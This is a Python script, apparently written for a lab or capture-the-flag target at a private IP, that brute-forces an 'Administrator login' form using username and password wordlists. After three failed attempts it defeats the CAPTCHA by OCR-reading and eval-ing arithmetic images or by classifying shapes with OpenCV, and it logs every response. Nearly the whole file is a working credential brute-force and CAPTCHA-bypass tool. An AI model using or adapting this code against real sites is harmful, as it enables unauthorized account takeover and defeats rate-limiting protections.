from PIL import Image
import requests
import cv2
import numpy as np
import base64
import io
import re
import pytesseract
from bs4 import BeautifulSoup
from io import BytesIO


def get_image_from_html(html_content):
    """Extract and decode the image from HTML content."""
    soup = BeautifulSoup(html_content, 'html.parser')
    img_tag = soup.find('img')
    if img_tag and 'src' in img_tag.attrs:
        src = img_tag['src']
        if src.startswith('data:image/png;base64,'):
            base64_data = src.split('data:image/png;base64,')[-1]
            image_data = base64.b64decode(base64_data)
            image = np.array(Image.open(BytesIO(image_data)))
            return image
    return None

def detect_shapes(image):
    """Detect geometric shapes (circle, square, triangle) in an image."""
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    # Apply Gaussian blur to reduce noise and improve edge detection
    blurred = cv2.GaussianBlur(gray, (5, 5), 1.5)
    # Use adaptive thresholding
    thresh = cv2.adaptiveThreshold(blurred, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY_INV, 11, 2)

    # Detect circles using Hough Circle Transform
    circles = cv2.HoughCircles(blurred, cv2.HOUGH_GRADIENT, 1, 20, param1=50, param2=30, minRadius=0, maxRadius=0)
    if circles is not None:
        return "circle"

    # Detect other shapes based on contours
    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    for cnt in contours:
        # Calculate perimeter and use it to set the approximation accuracy
        peri = cv2.arcLength(cnt, True)
        approx = cv2.approxPolyDP(cnt, 0.04 * peri, True)  # Adjust this value if necessary
        if len(approx) == 3:
            return "triangle"
        elif len(approx) == 4:
            x, y, w, h = cv2.boundingRect(approx)
            aspect_ratio = float(w) / h
            if 0.95 <= aspect_ratio <= 1.05:
                return "square"

    return None

def solve_equation(image):
    """Solve a mathematical equation from an image using OCR."""
    if image is None:
        return "No image found"
    text = pytesseract.image_to_string(image, config='--psm 6')
    text = re.sub(r'[^0-9+\-*/(). ]', '', text).strip()
    try:
        result = eval(text)
        return result
    except:
        return "Failed to solve equation"

def send_post_request(url, data, headers):
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    """ Sends a POST request to the specified URL with the given data and headers. """
    response = requests.post(url, data=data, headers=headers)
    return response


def solve_captcha(html_content):
    image = get_image_from_html(html_content)
        # Try to detect shapes first
    shape_result = solve_equation(image)
    if shape_result != "Failed to solve equation":
        return shape_result
    # Try to solve as an equation
    return detect_shapes(image)

def handle_login(url, usernames, passwords):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    login_data = {'username':'test', 'password':'pass'}
    response = send_post_request(url, login_data ,headers)
    counter = 0
    for username in usernames:
        for password in passwords:
            while True:  # Loop to keep trying until CAPTCHA is solved or login succeeds
                if "Administrator login" not in response.text:
                    break
                if "Detected 3 incorrect login attempts" in response.text:
                    captcha_solution = solve_captcha(response.text)
                    if captcha_solution:
                        captcha_data = {'captcha':captcha_solution}
                        # print(captcha_data)
                        response = send_post_request(url, captcha_data, headers)
                    else:
                        print("Failed to solve CAPTCHA, trying again.")
                else:
                    login_data = {'username':username, 'password':password}
                    response = send_post_request(url, login_data, headers)
                    print(f'{counter} Trying username: {username}, password: {password}')
                    counter += 1
                    response_text = response.text
                    with open('response.txt', 'a') as file:
                        file.write(response_text + '\n\n')
                    if "Administrator login" not in response.text:
                            print('Login successful.')
                            break
                    break  # Exit the CAPTCHA loop if no CAPTCHA is needed

def main():
    url = 'http://10.10.118.79/login'
    with open('usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file]
    with open('passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file]

    handle_login(url, usernames, passwords)

if __name__ == '__main__':
    main()
